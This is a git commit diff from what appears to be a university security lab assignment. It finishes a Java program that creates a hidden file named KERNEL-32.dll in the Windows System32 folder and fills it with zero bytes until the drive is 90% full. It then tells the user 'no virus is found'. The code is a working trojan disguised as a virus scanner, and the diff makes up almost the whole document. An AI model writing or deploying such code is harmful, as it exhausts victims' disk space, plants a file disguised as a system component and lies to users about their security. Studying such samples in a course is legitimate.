b2165ec98f91e32ff6651ff35dcd387cafa9d295
Chris Thomas <faore@onhaven.net>
2017-02-20 20:58:24 -0700

    Finished working version. Fills 90% of the drive, slowly and safely.

--- src/csci476/lab3/Main.java
+++ src/csci476/lab3/Main.java
@@ -2,48 +2,62 @@ package csci476.lab3;
 import java.io.*;
 import java.nio.file.*;
 import static java.nio.file.Files.newOutputStream;
+import static java.nio.file.StandardOpenOption.CREATE;
 import static java.nio.file.StandardOpenOption.CREATE_NEW;
 
 public class Main {
 
+    public static final boolean DEBUG = false;
+
     public static void main(String[] args) throws IOException {
 	// write your code here
-        File rootDrive = new File("/Windows/System32");
-        //set the rootDrive to be System32, i have %systemroot% that way because I assume that will work
-        long rootDriveTotalSize = rootDrive.getTotalSpace();
-        //retrieves the total space of System 32
-        long rootDriveFillableSize = (long)(rootDriveTotalSize*.90)-rootDrive.getUsableSpace();
-        //calculates 90% of space of drive and removes free space so you get the amount of space needed to make the drive 90% full.
-        byte one = 1;
-        Path dllPath = Paths.get("/Windows/System32/KERNEL-32.dll");
-        try (OutputStream out = new BufferedOutputStream(
-                Files.newOutputStream(dllPath, CREATE_NEW))) {
+        Path dllPath = Paths.get(System.getenv("SYSTEMROOT") + "/System32/KERNEL-32.dll");
 
-        } catch (IOException x) {
-            System.err.println(x);
+        if(DEBUG) {
+            System.out.println("Attempting to create new file at " + dllPath.toString());
         }
-        Files.setAttribute(dllPath, "dos:hidden",true);
+        /*
+         * Attempt to create the file and set its attribute. If the file already exists, just open it.
+         */
+        OutputStream out;
+        try {
+            out = new BufferedOutputStream(Files.newOutputStream(dllPath, CREATE));
+            Files.setAttribute(dllPath, "dos:hidden",true);
+        } catch (AccessDeniedException e) {
+            System.err.println("Access was denied while trying to create file.");
+            return;
+        }
 
-        //create hidden dummy .dll file KERNEL-32.dll
-        //make that file hidden.
+        File dllFile = new File(dllPath.toString());
 
 
-        System.out.println("Tota disk size: "+ rootDriveTotalSize);
-        System.out.println("Usable space: "+ rootDrive.getUsableSpace());
-        System.out.println("size to be filled up: " + rootDriveFillableSize);
+        System.out.println("Total disk size: " + dllFile.getTotalSpace());
+        System.out.println("Usable space: " + dllFile.getFreeSpace());
+        System.out.println("Size to be filled up: " + getAmountOfSpaceToFill(dllFile));
         //The above three lines are for debugging.
 
 
 
-        /*
-        while(dummyDLL.length() < rootDriveFillableSize){
 
-            //add one to the file.
+        while(getAmountOfSpaceToFill(dllFile) >= 0){
+            writeMB(out);
         }
-        */
 
 
         System.out.println("The scanning finished and no virus is found!");
         //tell the user they have no viruses.
+    }
+
+    public static long getAmountOfSpaceToFill(File dllFile) {
+        return (long)((dllFile.getTotalSpace() * 0.9) - (dllFile.getTotalSpace() - dllFile.getFreeSpace()));
+    }
+
+    public static void writeMB(OutputStream outputStream) throws IOException {
+        byte[] bytes = new byte[1];
+        bytes[0] = 0;
+        for(int i = 0; i < 1000000; i++) {
+            outputStream.write(bytes);
+        }
+
     }
 }
